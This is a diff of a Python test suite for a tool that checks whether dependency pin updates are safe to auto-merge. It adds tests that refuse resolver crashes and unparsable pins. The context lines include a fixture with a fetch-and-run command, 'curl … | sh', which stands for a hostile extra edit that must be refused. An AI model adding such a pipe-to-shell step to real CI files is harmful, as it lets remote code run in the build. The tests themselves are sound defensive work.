@@ -335,18 +335,21 @@ class PinTagTests(unittest.TestCase):
 
         self.refused(pin_files(), r"ci\.yml.*actions/checkout.*network unreachable", broken)
 
-    def test_unexpected_resolver_crash_is_not_a_merge(self):
+    def test_unexpected_resolver_crash_is_refused_with_a_reason(self):
+        """R1-01: a crash in the lookup gives a clean exit 1 and a reason, not a traceback (and never a merge)."""
+
         def crash(repo, tag):
             raise OSError("boom")
 
-        api = make_api(files=pin_files())
-        out, err = io.StringIO(), io.StringIO()
-        try:
-            code = merge_ready.main([str(N), SHA, "dependabot"], api=api, out=out, err=err, resolver=crash)
-        except OSError:
-            code = 1  # an uncaught crash also stops the merge; the assertion below is what matters
-        self.assertEqual(code, 1, err.getvalue())
-        self.assertEqual(api.merged, [])
+        self.refused(pin_files(), r"ci\.yml.*actions/checkout.*v7\.1\.0.*lookup crashed \(OSError\)", crash)
+
+    def test_a_pin_that_pin_only_accepts_but_cannot_be_parsed_is_refused(self):
+        """R1-02: every line pin_only accepts must get the tag check; a line the tag check cannot read fails closed."""
+        old, new = "      - uses: actions/checkout/@" + "a" * 40 + " # v1.0.0", "      - uses: actions/checkout/@" + "b" * 40 + " # v9.9.9"
+        self.assertTrue(merge_ready.pin_only(f"@@ -3 +3 @@\n-{old}\n+{new}"), "precondition: pin_only accepts this diff")
+        calls = []
+        self.refused(pin_files(old, new), r"ci\.yml.*unparsed pin", fake_resolver(calls=calls))
+        self.assertEqual(calls, [])
 
     def test_a_pin_change_with_extra_edits_is_still_refused_even_when_the_sha_is_right(self):
         patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
